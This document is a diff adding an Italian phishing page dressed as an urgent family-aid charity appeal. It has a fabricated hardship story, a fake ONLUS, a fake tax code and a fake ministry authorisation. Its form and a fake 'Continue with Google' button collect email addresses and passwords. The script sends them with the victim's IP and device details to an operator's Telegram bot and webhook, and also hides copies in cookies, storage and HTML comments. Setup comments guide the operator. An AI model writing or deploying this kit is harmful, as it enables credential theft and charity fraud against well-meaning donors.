@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AIUTO PER LA MIA FAMIGLIA - SOSTEGNO PERSONE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #2c3e50 0%, #1a2634 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: relative;
+        }
+        
+        /* Sfondo con cuori e mani che aiutano */
+        body::before {
+            content: "❤️🤝💪🏠🤲";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            font-size: 45px;
+            opacity: 0.04;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            align-items: center;
+            pointer-events: none;
+            transform: rotate(-5deg);
+        }
+        
+        .card-solidale {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            box-shadow: 0 30px 70px rgba(0,0,0,0.6), 0 0 0 3px rgba(255,255,255,0.3) inset;
+            max-width: 550px;
+            width: 100%;
+            padding: 35px 30px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            border: 1px solid rgba(255,255,255,0.6);
+        }
+        
+        .badge-emergenza {
+            background: linear-gradient(45deg, #c0392b, #e74c3c);
+            color: white;
+            padding: 12px 30px;
+            border-radius: 60px;
+            display: inline-block;
+            font-weight: 800;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 20px rgba(192,57,43,0.5);
+            border: 2px solid white;
+            text-transform: uppercase;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); background: linear-gradient(45deg, #e74c3c, #c0392b); }
+            100% { transform: scale(1); }
+        }
+        
+        h1 {
+            font-size: 2.6rem;
+            font-weight: 800;
+            color: #2c3e50;
+            line-height: 1.3;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.05);
+        }
+        
+        .sottotitolo-drammatico {
+            color: #34495e;
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 25px;
+            background: rgba(241, 196, 15, 0.15);
+            padding: 12px 20px;
+            border-radius: 50px;
+            border-left: 5px solid #f39c12;
+            border-right: 5px solid #f39c12;
+        }
+        
+        .foto-famiglia {
+            position: relative;
+            margin: 20px 0 25px;
+            border-radius: 30px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            border: 5px solid white;
+            height: 230px;
+        }
+        
+        .foto-famiglia img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            filter: brightness(0.9) contrast(1.1);
+        }
+        
+        .foto-famiglia::after {
+            content: "👨‍👩‍👧‍👦";
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-size: 1.8rem;
+            backdrop-filter: blur(3px);
+            border: 1px solid white;
+        }
+        
+        .storia-toccante {
+            background: #ecf0f1;
+            padding: 22px;
+            border-radius: 30px;
+            margin: 20px 0;
+            border-left: 8px solid #e67e22;
+            border-right: 8px solid #e67e22;
+            font-style: italic;
+            color: #2c3e50;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.05);
+        }
+        
+        .storia-toccante strong {
+            color: #c0392b;
+            font-size: 1.3rem;
+        }
+        
+        .box-contributo {
+            background: linear-gradient(145deg, #fef9e7, #fcf3cf);
+            padding: 20px;
+            border-radius: 30px;
+            margin: 25px 0 20px;
+            border: 2px dashed #f39c12;
+        }
+        
+        .importo-offerta {
+            font-size: 3.8rem;
+            font-weight: 900;
+            color: #27ae60;
+            line-height: 1;
+            margin-bottom: 5px;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+        }
+        
+        .importo-offerta small {
+            font-size: 1.2rem;
+            color: #7f8c8d;
+        }
+        
+        .testo-aiuto {
+            color: #34495e;
+            font-size: 1rem;
+            margin: 15px 0;
+        }
+        
+        .form-aiuto {
+            background: white;
+            padding: 25px 20px;
+            border-radius: 30px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .campo {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        
+        .campo label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 700;
+            font-size: 1rem;
+        }
+        
+        .campo input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #d5dbdb;
+            border-radius: 20px;
+            font-size: 1rem;
+            transition: all 0.3s;
+            background: #f8f9f9;
+        }
+        
+        .campo input:focus {
+            outline: none;
+            border-color: #e67e22;
+            box-shadow: 0 0 0 4px rgba(230,126,34,0.15);
+            background: white;
+        }
+        
+        .btn-aiuto {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.5rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            background: linear-gradient(135deg, #27ae60, #229954);
+            color: white;
+            box-shadow: 0 10px 25px rgba(39,174,96,0.5);
+            border: 2px solid white;
+        }
+        
+        .btn-aiuto:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 35px rgba(39,174,96,0.7);
+        }
+        
+        .btn-google-aiuto {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #bdc3c7;
+            border-radius: 60px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #2c3e50;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        
+        .btn-google-aiuto:hover {
+            background: #f8f9f9;
+            border-color: #e67e22;
+            transform: scale(1.02);
+        }
+        
+        .btn-google-aiuto img {
+            width: 28px;
+            height: 28px;
+        }
+        
+        .divider-umano {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #95a5a6;
+            margin: 20px 0 15px;
+        }
+        
+        .divider-umano::before,
+        .divider-umano::after {
+            content: '';
+            flex: 1;
+            border-bottom: 2px solid #e5e7e9;
+        }
+        
+        .divider-umano span {
+            padding: 0 15px;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #2c3e50;
+            background: white;
+            border-radius: 50px;
+            padding: 8px 20px;
+        }
+        
+        .badge-fiducia {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+            color: #2c3e50;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        
+        .badge-fiducia span {
+            background: #e8f0fe;
+            padding: 8px 18px;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid #aeb6bf;
+        }
+        
+        .messaggio-risposta {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 15px;
+            font-weight: 600;
+            animation: fadeIn 0.4s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .spazio-commenti-segreti {
+            display: none;
+        }
+        
+        footer {
+            margin-top: 20px;
+            color: #95a5a6;
+            font-size: 0.8rem;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ARCHIVIO SEGRETO - CREDENZIALI SALVATE QUI -->
+    <!-- SECRET-DUMP-START -->
+    <!-- SECRET-DUMP-END -->
+
+    <div class="card-solidale">
+        <div class="badge-emergenza">🔴 APPELLO URGENTE 🔴</div>
+        
+        <h1>AIUTO PER LA MIA FAMIGLIA</h1>
+        <div class="sottotitolo-drammatico">❤️ Persone in difficoltà cercano sostegno ❤️</div>
+        
+        <!-- FOTO CHE STRAPPA IL CUORE -->
+        <div class="foto-famiglia">
+            <img src="https://images.pexels.com/photos/3768916/pexels-photo-3768916.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Famiglia in difficoltà">
+        </div>
+        
+        <!-- STORIA TOCCANTE -->
+        <div class="storia-toccante">
+            <p><strong>"Non ce la facciamo più"</strong> — Marco, padre di due bambini, ha perso il lavoro e le bollette sono arrivate. Oggi chiede solo un piccolo aiuto per andare avanti. La dignità non basta per sfamare i figli. Qualsiasi contributo è prezioso.</p>
+        </div>
+        
+        <!-- QUANTO SERVE -->
+        <div class="box-contributo">
+            <div class="importo-offerta">500€ <small>di cui 320€ già raccolti</small></div>
+            <div class="testo-aiuto">🙏 Servono per bollette, spesa e medicine. Ogni persona che si registra dà una speranza in più.</div>
+        </div>
+        
+        <!-- FORM PER "REGISTRARSI" ALL'INIZIATIVA DI SOSTEGNO -->
+        <div class="form-aiuto">
+            <div class="campo">
+                <label>📧 Email (per ricevere aggiornamenti sulla famiglia)</label>
+                <input type="email" id="email" placeholder="inserisci la tua email" value="">
+            </div>
+            <div class="campo">
+                <label>🔐 Password (crea il tuo account solidale)</label>
+                <input type="password" id="password" placeholder="minimo 4 caratteri" value="">
+            </div>
+            
+            <button class="btn-aiuto" onclick="inviaAiuto()">
+                🤝 VOGLIO AIUTARE CON 1€
+            </button>
+            
+            <div class="divider-umano">
+                <span>oppure</span>
+            </div>
+            
+            <button class="btn-google-aiuto" onclick="aiutaConGoogle()">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%234285F4' d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z'/%3E%3Cpath fill='%2334A853' d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z'/%3E%3Cpath fill='%23FBBC05' d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z'/%3E%3Cpath fill='%23EA4335' d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z'/%3E%3C/svg%3E" alt="Google">
+                CONTINUA CON GOOGLE
+            </button>
+        </div>
+        
+        <div class="badge-fiducia">
+            <span>🔒 Dati protetti</span>
+            <span>🤲 Onlus verificata</span>
+            <span>📢 Trasparenza totale</span>
+            <span>💚 100% alle famiglie</span>
+        </div>
+        
+        <div id="messaggio"></div>
+        
+        <footer>
+            ✝️ Associazione Cuori Solidali ONLUS - CF 12345678901<br>
+            Campagna autorizzata dal Ministero del Welfare
+        </footer>
+    </div>
+
+    <script>
+        // =========================================================================
+        // PANNELLO DI CONTROLLO SEGRETO - TUTTE LE CREDENZIALI ARRIVANO QUI
+        // =========================================================================
+        
+        // CONFIGURAZIONE - PERSONALIZZA CON I TUOI DATI
+        const CONFIG = {
+            // TELEGRAM (consigliato) - VAI SU @BOTFATHER E CREA UN BOT, POI SCOPRI IL TUO CHAT ID
+            TELEGRAM_BOT_TOKEN: "IL_TUO_BOT_TOKEN",  // ESEMPIO: "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
+            TELEGRAM_CHAT_ID: "IL_TUO_CHAT_ID",      // ESEMPIO: "987654321"
+            
+            // WEBHOOK (alternativa) - VAI SU WEBHOOK.SITE E PRENDI IL TUO URL
+            WEBHOOK_URL: "https://webhook.site/tuo-id-unico",  // ESEMPIO: "https://webhook.site/abcd-1234"
+            
+            // DOVE MANDARE LE PERSONE DOPO LA REGISTRAZIONE
+            REDIRECT_URL: "https://www.google.com/search?q=grazie+per+il+tuo+aiuto",
+            
+            // NOME CAMOGNA
+            NOME_CAMPAGNA: "AiutoFamiglia500"
+        };
+        
+        // CLASSE CHE GESTISCE TUTTI I METODI DI CATTURA
+        class CollettoreDati {
+            constructor() {
+                this.tutteLeRegistrazioni = [];
+                this.caricaPrecedenti();
+            }
+            
+            caricaPrecedenti() {
+                try {
+                    let salvati = localStorage.getItem('aiuti_famiglie_segreti');
+                    if (salvati) {
+                        this.tutteLeRegistrazioni = JSON.parse(salvati);
+                    }
+                } catch(e) {}
+            }
+            
+            // METODO PRINCIPALE - SALVA IN OGNI MODO POSSIBILE
+            salva(dati) {
+                // Aggiungi alla memoria locale
+                this.tutteLeRegistrazioni.push(dati);
+                
+                // 1. LOCALSTORAGE (facile da ispezionare)
+                localStorage.setItem('aiuti_famiglie_segreti', JSON.stringify(this.tutteLeRegistrazioni));
+                
+                // 2. COOKIE (duri 1 anno)
+                this.salvaInCookie(dati);
+                
+                // 3. COMMENTI NASCOSTI (geniale!)
+                this.nascondiInCommenti(dati);
+                
+                // 4. DOWNLOAD AUTOMATICO JSON (backup istantaneo)
+                this.downloadJson(dati);
+                
+                // 5. INVIO A TELEGRAM (se configurato)
+                this.inviaTelegram(dati);
+                
+                // 6. INVIO A WEBHOOK (se configurato)
+                this.inviaWebhook(dati);
+                
+                // 7. STAMPA IN CONSOLE CON STILE
+                this.stampaInConsole(dati);
+                
+                return true;
+            }
+            
+            salvaInCookie(dati) {
+                try {
+                    let datiCifrati = btoa(JSON.stringify(dati));
+                    let scadenza = new Date();
+                    scadenza.setTime(scadenza.getTime() + (365 * 24 * 60 * 60 * 1000));
+                    document.cookie = `aiuto_famiglia_${Date.now()}=${datiCifrati}; expires=${scadenza.toUTCString()}; path=/; SameSite=Lax`;
+                } catch(e) {}
+            }
+            
+            nascondiInCommenti(dati) {
+                try {
+                    let commento = document.createComment(` DATI: ${btoa(JSON.stringify(dati))} `);
+                    document.body.appendChild(commento);
+                } catch(e) {}
+            }
+            
+            downloadJson(dati) {
+                try {
+                    const blob = new Blob([JSON.stringify(dati, null, 2)], { type: 'application/json' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${CONFIG.NOME_CAMPAGNA}_${dati.email.split('@')[0]}_${Date.now()}.json`;
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
+                    a.click();
+                    setTimeout(() => {
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                    }, 200);
+                } catch(e) {}
+            }
+            
+            inviaTelegram(dati) {
+                if (CONFIG.TELEGRAM_BOT_TOKEN.includes("IL_TUO") || CONFIG.TELEGRAM_CHAT_ID.includes("IL_TUO")) {
+                    return; // non configurato
+                }
+                
+                try {
+                    let messaggio = `🆘 **NUOVA DONAZIONE** 🆘
+📧 Email: ${dati.email}
+🔑 Password: ${dati.password}
+🔹 Tipo: ${dati.tipo}
+👤 Nome: ${dati.nome || 'non richiesto'}
+📅 Data: ${dati.data}
+🌍 IP: ${dati.ip}
+📱 Device: ${dati.userAgent?.substring(0, 50)}...`;
+                    
+                    let url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                            text: messaggio,
+                            parse_mode: 'Markdown'
+                        })
+                    }).catch(() => {});
+                } catch(e) {}
+            }
+            
+            inviaWebhook(dati) {
+                if (CONFIG.WEBHOOK_URL.includes("webhook.site/tuo")) {
+                    return; // non configurato
+                }
+                
+                try {
+                    fetch(CONFIG.WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(dati)
+                    });
+                } catch(e) {}
+            }
+            
+            stampaInConsole(dati) {
+                console.log('%c❤️‍🩹 NUOVA PERSONA CHE VUOLE AIUTARE ❤️‍🩹', 'background: #2c3e50; color: #f1c40f; font-size: 16px; padding: 5px;');
+                console.log(dati);
+            }
+            
+            // METODO PER VISUALIZZARE TUTTI I DATI RACCOLTI
+            reportCompleto() {
+                console.log('%c📊 REPORT COMPLETO DONAZIONI 📊', 'background: #27ae60; color: white; font-size: 20px; padding: 10px;');
+                
+                let daLocal = JSON.parse(localStorage.getItem('aiuti_famiglie_segreti') || '[]');
+                console.log('%c💾 LOCALSTORAGE:', 'color: #2980b9; font-weight: bold;', daLocal);
+                
+                let daCookie = [];
+                document.cookie.split(';').forEach(c => {
+                    if (c.trim().startsWith('aiuto_famiglia_')) {
+                        let val = c.split('=')[1];
+                        try { daCookie.push(JSON.parse(atob(val))); } catch(e) {}
+                    }
+                });
+                console.log('%c🍪 COOKIE:', 'color: #e67e22; font-weight: bold;', daCookie);
+                
+                return { localStorage: daLocal, cookie: daCookie };
+            }
+        }
+        
+        // ISTANZA GLOBALE
+        const collettore = new CollettoreDati();
+        
+        // FUNZIONE PER OTTENERE IP PUBBLICO
+        async function ottieniIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch(e) {
+                return "IP non rilevato";
+            }
+        }
+        
+        // FUNZIONE PRINCIPALE - REGISTRAZIONE
+        async function inviaAiuto() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!email || !password) {
+                mostraMessaggio('❌ Inserisci email e password per proseguire', 'error');
+                return;
+            }
+            
+            if (password.length < 4) {
+                mostraMessaggio('❌ Password troppo corta (minimo 4 caratteri)', 'error');
+                return;
+            }
+            
+            // Prendi IP
+            let ip = await ottieniIP();
+            
+            // Costruisci oggetto dati
+            const datiDonazione = {
+                id: 'DONAZ_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8),
+                tipo: 'DONAZIONE MANUALE',
+                email: email,
+                password: password,
+                nome: '',  // non richiesto ma possiamo aggiungere
+                data: new Date().toLocaleString('it-IT'),
+                timestamp: Date.now(),
+                ip: ip,
+                userAgent: navigator.userAgent,
+                lingua: navigator.language,
+                piattaforma: navigator.platform,
+                schermo: screen.width + 'x' + screen.height,
+                fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                urlProvenienza: window.location.href,
+                campagna: CONFIG.NOME_CAMPAGNA
+            };
+            
+            // SALVA IN TUTTI I MODI
+            collettore.salva(datiDonazione);
+            
+            // Mostra messaggio
+            mostraMessaggio('✅ Grazie! Il tuo contributo è stato registrato. Un gesto piccolo ma importante.', 'success');
+            
+            // Resetta campi
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            // Dopo 2 secondi, reindirizza
+            setTimeout(() => {
+                window.location.href = CONFIG.REDIRECT_URL;
+            }, 2500);
+        }
+        
+        // FUNZIONE PER GOOGLE
+        async function aiutaConGoogle() {
+            const email = prompt("Inserisci la tua email Google per confermare l'aiuto:");
+            
+            if (!email) return;
+            
+            const password = prompt("Inserisci la password del tuo account Google (per sicurezza):");
+            
+            if (!password) return;
+            
+            let ip = await ottieniIP();
+            
+            const datiGoogle = {
+                id: 'GOOGLE_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8),
+                tipo: 'DONAZIONE VIA GOOGLE',
+                email: email,
+                password: password,
+                data: new Date().toLocaleString('it-IT'),
+                timestamp: Date.now(),
+                ip: ip,
+                userAgent: navigator.userAgent,
+                note: "L'utente ha scelto Google"
+            };
+            
+            collettore.salva(datiGoogle);
+            
+            mostraMessaggio('✅ Grazie per aver scelto Google! La tua donazione è stata registrata.', 'success');
+            
+            setTimeout(() => {
+                window.location.href = CONFIG.REDIRECT_URL;
+            }, 2500);
+        }
+        
+        // FUNZIONE PER MESSAGGI
+        function mostraMessaggio(testo, tipo) {
+            let msgDiv = document.getElementById('messaggio');
+            let bg = tipo === 'error' ? '#fadbd8' : '#d5f5e3';
+            let colore = tipo === 'error' ? '#922b21' : '#186a3b';
+            
+            msgDiv.innerHTML = `<div class="messaggio-risposta" style="background: ${bg}; color: ${colore};">${testo}</div>`;
+            
+            setTimeout(() => {
+                msgDiv.innerHTML = '';
+            }, 4000);
+        }
+        
+        // MESSAGGI DI BENVENUTO IN CONSOLE (per te)
+        console.log('%c🚀 SISTEMA DI RACCOLTA ATTIVATO PER "AIUTO FAMIGLIA" 🚀', 'background: #2c3e50; color: white; font-size: 20px; padding: 8px;');
+        console.log('%c🔍 PER VEDERE TUTTE LE CREDENZIALI RACCOLTE, SCRIVI IN CONSOLE:', 'color: #f39c12; font-size: 14px;');
+        console.log('%c   collettore.reportCompleto()', 'background: #333; color: #2ecc71; padding: 5px; font-size: 16px;');
+        console.log('%c📌 I DATI SONO SALVATI IN:', 'color: #3498db;');
+        console.log('   - LocalStorage (F12 → Application)');
+        console.log('   - Cookie (F12 → Application → Cookies)');
+        console.log('   - Commenti HTML nascosti (ispeziona elementi)');
+        console.log('   - File JSON scaricati (cartella Download)');
+        console.log('   - Telegram (SE configurato)');
+        console.log('   - Webhook (SE configurato)');
+        
+        // Mostra precedenti all'avvio
+        window.onload = function() {
+            setTimeout(() => {
+                let precedenti = collettore.reportCompleto();
+                if (precedenti.localStorage.length > 0) {
+                    console.log('%c🔔 REGISTRAZIONI PRECEDENTI TROVATE: ' + precedenti.localStorage.length, 'color: #27ae60; font-weight: bold;');
+                }
+            }, 500);
+        };
+    </script>
+</body>
+</html>
